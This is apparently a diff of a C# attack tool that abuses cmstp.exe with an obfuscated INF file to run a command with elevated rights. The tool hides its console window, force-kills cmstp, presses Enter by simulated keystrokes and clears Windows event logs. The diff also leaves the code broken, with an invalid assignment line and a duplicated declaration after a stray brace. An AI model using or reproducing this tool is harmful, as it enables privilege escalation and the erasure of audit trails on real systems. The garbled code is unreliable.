@@ -33,7 +33,7 @@ public class Program
     // Deobfuscate using XOR
     private static string Deobfuscate(string input)
     {
-        byte[] bytes = Convert.FromBase64String(input);
+        byte[] bytes =);
         for (int i = 0; i < bytes.Length; i++)
         {
             bytes[i] ^= 0x55; // XOR with the same key
@@ -51,32 +51,15 @@ public class Program
 
     public static void Main(string[] args)
     {
-        string payloadCommand = "runlegacyexplorer.exe";
+        if (args.Length < 2)
+        {
+            Console.WriteLine("Invalid arguments. Usage: Program.exe <command> <obfuscatedInf>");
+            return;
+        }
 
-        const string infTemplate = @"
-[version]
-Signature=$chicago$
-AdvancedINF=2.5
+        string payloadCommand = args[0];
+        string obfuscatedInf = args[1];
 
-[DefaultInstall]
-CustomDestination=CustInstDestSectionAllUsers
-RunPreSetupCommands=RunPreSetupCommandsSection
-
-[RunPreSetupCommandsSection]
-taskkill /F /IM cmstp.exe
-
-[CustInstDestSectionAllUsers]
-49000,49001=AllUSer_LDIDSection, 7
-
-[AllUSer_LDIDSection]
-""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
-
-[Strings]
-ServiceName=""CorpVPN""
-ShortSvcName=""CorpVPN""
-";
-
-        string obfuscatedInf = Obfuscate(infTemplate);
         ExecutePayload(payloadCommand, obfuscatedInf);
     }
 
@@ -88,31 +71,24 @@ ShortSvcName=""CorpVPN""
         ShowWindow(consoleWindow, 0); // Hide console window
 
         // Ensure cmstp.exe is not running
-        ProcessStartInfo taskkillInfo = new ProcessStartInfo("taskkill")
+        Process.Start(new ProcessStartInfo("taskkill", "/F /IM cmstp.exe")
         {
-            Arguments = "/F /IM cmstp.exe",
             UseShellExecute = false,
             CreateNoWindow = true
-        };
-        Process.Start(taskkillInfo);
+        });
 
         string infFilePath = CreateInfFile(command, obfuscatedInf);
         Console.WriteLine("Obfuscated payload file written to " + infFilePath);
 
         // Execute cmstp with the obfuscated INF file
-        ProcessStartInfo cmstpInfo = new ProcessStartInfo(CmstpPath)
+        Process.Start(new ProcessStartInfo(CmstpPath, "/au \"" + infFilePath + "\"")
         {
-            Arguments = "/au \"" + infFilePath + "\"", // Quote to handle spaces
             UseShellExecute = false,
             CreateNoWindow = true
-        };
-        Process.Start(cmstpInfo);
+        });
 
         IntPtr cmstpHandle = IntPtr.Zero;
-        do
-        {
-            cmstpHandle = GetProcessHandle("cmstp");
-        } while (cmstpHandle == IntPtr.Zero);
+        while ((cmstpHandle = GetProcessHandle("cmstp")) == IntPtr.Zero) { }
 
         SendKeys.SendWait("{ENTER}");
 
@@ -123,8 +99,10 @@ ShortSvcName=""CorpVPN""
     {
         Process[] processes = Process.GetProcessesByName(processName);
         if (processes.Length == 0) return IntPtr.Zero;
+
         IntPtr handle = processes[0].MainWindowHandle;
         if (handle == IntPtr.Zero) return IntPtr.Zero;
+
         SetForegroundWindow(handle);
         ShowWindow(handle, 5);
         return handle;
@@ -162,6 +140,10 @@ ShortSvcName=""CorpVPN""
             eventLog.Clear();
         }
     }
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+}
 
     [DllImport("kernel32.dll")]
     public static extern IntPtr GetConsoleWindow();
